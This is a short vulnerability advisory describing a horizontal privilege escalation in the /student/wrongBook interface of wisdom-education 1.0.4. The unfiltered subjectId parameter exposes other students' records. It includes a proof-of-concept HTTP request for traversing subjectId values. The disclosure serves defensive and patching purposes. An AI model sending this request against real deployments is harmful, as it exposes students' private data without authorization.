# Vulnerability Introduction

The /student/wrongBook interface of wisdom-education 1.0.4 version has a horizontal privilege escalation vulnerability. An attacker can view others' information by modifying the subjectId parameter.

# Vulnerability Analysis

Vulnerable class file： src/main/java/com/education/api/controller/student/WrongBookController.java

![image-20250928023053271](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928023053271.7lkd6tax4z.webp)

Call the `studentWrongBookService.selectPageList` method to monitor the underlying implementation

Vulnerable class file：src/main/resources/mapper/education/StudentWrongBookMapper.xml

![image-20250928023243746](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928023243746.7pny1qgmb.webp)

The underlying query mainly relies on wrongBookQuery.subjectId, which is passed through the wrongBookQuery model without any filtering, resulting in unauthorized access to other people's information.

![image-20250928023436493](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928023436493.96a46a8ihj.webp)

## Vulnerability reproduction

poc

```
GET /student/wrongBook?pageNumber=1&pageSize=5&questionType=&subjectId=Traverse points HTTP/1.1
Host: 
Platform: educationStudent
Accept: application/json, text/plain, */*
Authorization: [your token]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![image-20250928023535975](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928023535975.175rb7tk8z.webp)

